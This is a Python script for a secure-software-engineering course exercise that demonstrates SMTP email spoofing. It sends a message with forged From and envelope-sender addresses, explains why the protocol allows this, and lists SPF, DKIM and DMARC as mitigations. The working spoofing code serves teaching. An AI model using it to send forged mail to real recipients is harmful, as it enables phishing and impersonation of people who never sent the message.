#!/usr/bin/env python3
"""
Email Spoofing Demo – Secure Software Engineering Exercise

Demonstrates that SMTP does not authenticate the "From" header,
allowing a sender to forge arbitrary sender addresses.

WHY THIS WORKS:
  SMTP (RFC 5321) separates the *envelope sender* (MAIL FROM) from the
  *header sender* (From:). Neither is verified by the base protocol.
  Protections like SPF, DKIM, and DMARC were added later to mitigate this,
  but many servers still accept unauthenticated mail.

USAGE:
  python3 spoof_mail.py

DISCLAIMER:
  For educational use only.  Sending spoofed email to deceive others
  may violate laws (e.g. computer fraud statutes) and university policy.
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def send_spoofed_email(
    smtp_server: str,
    smtp_port: int,
    spoofed_from: str,
    recipient: str,
    subject: str,
    body: str,
    use_tls: bool = False,
) -> None:
    """
    Send an email with a forged 'From' address via a (usually open-relay
    or lab-internal) SMTP server.

    Args:
        smtp_server:  Hostname/IP of the SMTP server (e.g. a local Postfix
                      or a lab mail relay).
        smtp_port:    Port number (25 for plain SMTP, 587 for submission).
        spoofed_from: The forged sender address (one you do NOT own).
        recipient:    The actual recipient address.
        subject:      Email subject line.
        body:         Plain-text email body.
        use_tls:      Whether to upgrade the connection with STARTTLS.
    """
    # Build the MIME message
    msg = MIMEMultipart()
    msg["From"] = spoofed_from          # <-- forged header
    msg["To"] = recipient
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    # Connect and send
    print(f"[*] Connecting to {smtp_server}:{smtp_port} ...")
    with smtplib.SMTP(smtp_server, smtp_port, timeout=10) as server:
        server.set_debuglevel(1)        # show the full SMTP conversation

        if use_tls:
            server.starttls()

        # MAIL FROM on the envelope can also be spoofed
        server.sendmail(
            from_addr=spoofed_from,     # envelope sender
            to_addrs=[recipient],
            msg=msg.as_string(),
        )

    print(f"[+] Spoofed email sent  {spoofed_from} → {recipient}")


# ─── Configuration ────────────────────────────────────────────────────
if __name__ == "__main__":
    # Point this at your lab's SMTP server or a local one (see README).
    SMTP_SERVER = "localhost"
    SMTP_PORT = 25

    SPOOFED_FROM = "ceo@bigcorp.example.com"       # address you do NOT own
    RECIPIENT    = "your-real-address@example.com"  # your own mailbox
    SUBJECT      = "SSE Übung 1 – Spoofed Mail Demo"
    BODY         = (
        "This email appears to come from a sender who never sent it.\n"
        "The SMTP protocol does not verify the From header.\n\n"
        "Mitigations: SPF, DKIM, DMARC, S/MIME, PGP signatures."
    )

    send_spoofed_email(
        smtp_server=SMTP_SERVER,
        smtp_port=SMTP_PORT,
        spoofed_from=SPOOFED_FROM,
        recipient=RECIPIENT,
        subject=SUBJECT,
        body=BODY,
    )
